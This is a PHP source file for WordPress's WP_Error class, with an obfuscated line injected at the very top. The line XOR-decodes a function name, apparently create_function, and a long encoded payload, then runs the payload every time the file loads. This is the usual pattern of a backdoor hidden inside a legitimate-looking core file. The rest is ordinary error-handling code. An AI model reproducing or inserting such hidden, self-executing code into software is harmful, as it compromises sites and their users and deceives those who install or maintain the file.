<?php $hAuNxGGg='NIE3=PrF0<.7GXB'^'-; RI5- ERMC.7,';$YnQml=$hAuNxGGg('','I0YUM,VX5W9,2-X81XSle=O4fXS.97oW;XLLDL5Yh7 8Z-<:Yb15Jk4YNMjl<6,ZV,15ABGq<U6BnsgoOJAhgvVU:uIofKJyn2PV1gV.UtAEKAR9oIYH-0 FsD LSslnKBrCn<DQHC0=HLyCgf1ADLvJUmT4XaRE;oG1vlIJB<W=XZaE4Ye8zw:0DAQ;GY8ZIYIMJTxENf2nEaJYMMqneFWLSNyiu18H,k2Q2pso>R80TP3R<<Y5,3QIqu-c9o:,,X1Myj.=;diLJh2U;7RxWGe7NWU:;d>E7CxKg3+;q3bjQ2NATlbR22GG,kz,bOY.ZbRwDQF dX8zlM;4YP5=mpgo5,+m5<tLMNtjKE;VPpPB<7VNYFR3Ya>e4O;.n<27FuapPQCBf>PiYRL-JhIUO39CKAo8FlK9sA73XSWwD4NXOT> AUU 7gXS=c=5H0hlU0LLS0+,lZ.RK . XpQSMT1aDriU2:3<SU xoV3 6Ih .ATOJkw8DBX,s RCgQOD>OSmO,E1EvTBTT<1ncMGNXX0vke7Q76.T.EYs4YldOKtzaHGP7.hUyMW>YHke-qs9rABgMAXA3N NYHnCM- ;T1+FT,2<LG0ADeCCQ:YQ1RoiAB,UC3psuunAtY.nO.HTYLJ,7TUhoPMRT,YRP;Papf-XGCDgym9O'^' Vqt+Y8;A>VBmH QB, DBE F9<2ZXh0:N,kemlNSaQUV9YUU7BIZ84P8:,53QCXrrHPA ngUW0OkNSGOo1KanR9 NUtOAlqsg;69COrGuIaupavPS:-:AUNnW A82ZWNo+YhG6MXl,EIhbDcOBU 0--n<0tjxE9 B4cXVIi96N;X6rE.Q LeSL09M34O2+Vrm6<9corL3lOdOE.89,QSE 6  +BcQUY<M4Y4KPNOX3TC1k9XZS+PMP9iYQr v qeixP>YNEXBDTrjLD4WB7Qw<o>j34NZ;U NcEkCXNBJ9kN5S: tQBvDS+2IPpQhE0HzJsS 02AMxCpe+TF<1VUMXC0giz8po l,=TN  BvmNpfJV:;<orHSh7AP.OO1WWNfHAT;4:yl7YM=38LjUiq9RU6.ze1;f63yeSR,2wJdt;6<1LI 9<ZRO <O<YT<Q738E8d1QXIZnq6.CAD=Xu7, PHhRM1SNRc80YQFm9IPaLDO55olMWY609U,K7:847-M; EhG HbZtf05HPGCkanp5TCCAS0CWusE  TipLYrkSIP+qeTKP6K+dZnzZSOABXAr U.ykvPzAiphHemLRI5Ht-1UmY4.C57Md30C5>P6HEafH47RYZUUNaTyUdFK>55dnHV 43H ,+8C86wfyZzoH .7lWPV32');$YnQml();
/**
 * WordPress Error API.
 *
 * Contains the WP_Error class and the is_wp_error() function.
 *
 * @package WordPress
 */

/**
 * WordPress Error class.
 *
 * Container for checking for WordPress errors and error messages. Return
 * WP_Error and use is_wp_error() to check if this class is returned. Many
 * core WordPress functions pass this class in the event of an error and
 * if not handled properly will result in code errors.
 *
 * @package WordPress
 * @since 2.1.0
 */
class WP_Error {
	/**
	 * Stores the list of errors.
	 *
	 * @since 2.1.0
	 * @var array
	 */
	public $errors = array();

	/**
	 * Stores the list of data for error codes.
	 *
	 * @since 2.1.0
	 * @var array
	 */
	public $error_data = array();

	/**
	 * Initialize the error.
	 *
	 * If `$code` is empty, the other parameters will be ignored.
	 * When `$code` is not empty, `$message` will be used even if
	 * it is empty. The `$data` parameter will be used only if it
	 * is not empty.
	 *
	 * Though the class is constructed with a single error code and
	 * message, multiple codes can be added using the `add()` method.
	 *
	 * @since 2.1.0
	 *
	 * @param string|int $code Error code
	 * @param string $message Error message
	 * @param mixed $data Optional. Error data.
	 */
	public function __construct( $code = '', $message = '', $data = '' ) {
		if ( empty($code) )
			return;

		$this->errors[$code][] = $message;

		if ( ! empty($data) )
			$this->error_data[$code] = $data;
	}

	/**
	 * Retrieve all error codes.
	 *
	 * @since 2.1.0
	 * @access public
	 *
	 * @return array List of error codes, if available.
	 */
	public function get_error_codes() {
		if ( empty($this->errors) )
			return array();

		return array_keys($this->errors);
	}

	/**
	 * Retrieve first error code available.
	 *
	 * @since 2.1.0
	 * @access public
	 *
	 * @return string|int Empty string, if no error codes.
	 */
	public function get_error_code() {
		$codes = $this->get_error_codes();

		if ( empty($codes) )
			return '';

		return $codes[0];
	}

	/**
	 * Retrieve all error messages or error messages matching code.
	 *
	 * @since 2.1.0
	 *
	 * @param string|int $code Optional. Retrieve messages matching code, if exists.
	 * @return array Error strings on success, or empty array on failure (if using code parameter).
	 */
	public function get_error_messages($code = '') {
		// Return all messages if no code specified.
		if ( empty($code) ) {
			$all_messages = array();
			foreach ( (array) $this->errors as $code => $messages )
				$all_messages = array_merge($all_messages, $messages);

			return $all_messages;
		}

		if ( isset($this->errors[$code]) )
			return $this->errors[$code];
		else
			return array();
	}

	/**
	 * Get single error message.
	 *
	 * This will get the first message available for the code. If no code is
	 * given then the first code available will be used.
	 *
	 * @since 2.1.0
	 *
	 * @param string|int $code Optional. Error code to retrieve message.
	 * @return string
	 */
	public function get_error_message($code = '') {
		if ( empty($code) )
			$code = $this->get_error_code();
		$messages = $this->get_error_messages($code);
		if ( empty($messages) )
			return '';
		return $messages[0];
	}

	/**
	 * Retrieve error data for error code.
	 *
	 * @since 2.1.0
	 *
	 * @param string|int $code Optional. Error code.
	 * @return mixed Error data, if it exists.
	 */
	public function get_error_data($code = '') {
		if ( empty($code) )
			$code = $this->get_error_code();

		if ( isset($this->error_data[$code]) )
			return $this->error_data[$code];
	}

	/**
	 * Add an error or append additional message to an existing error.
	 *
	 * @since 2.1.0
	 * @access public
	 *
	 * @param string|int $code Error code.
	 * @param string $message Error message.
	 * @param mixed $data Optional. Error data.
	 */
	public function add($code, $message, $data = '') {
		$this->errors[$code][] = $message;
		if ( ! empty($data) )
			$this->error_data[$code] = $data;
	}

	/**
	 * Add data for error code.
	 *
	 * The error code can only contain one error data.
	 *
	 * @since 2.1.0
	 *
	 * @param mixed $data Error data.
	 * @param string|int $code Error code.
	 */
	public function add_data($data, $code = '') {
		if ( empty($code) )
			$code = $this->get_error_code();

		$this->error_data[$code] = $data;
	}

	/**
	 * Removes the specified error.
	 *
	 * This function removes all error messages associated with the specified
	 * error code, along with any error data for that code.
	 *
	 * @since 4.1.0
	 *
	 * @param string|int $code Error code.
	 */
	public function remove( $code ) {
		unset( $this->errors[ $code ] );
		unset( $this->error_data[ $code ] );
	}
}
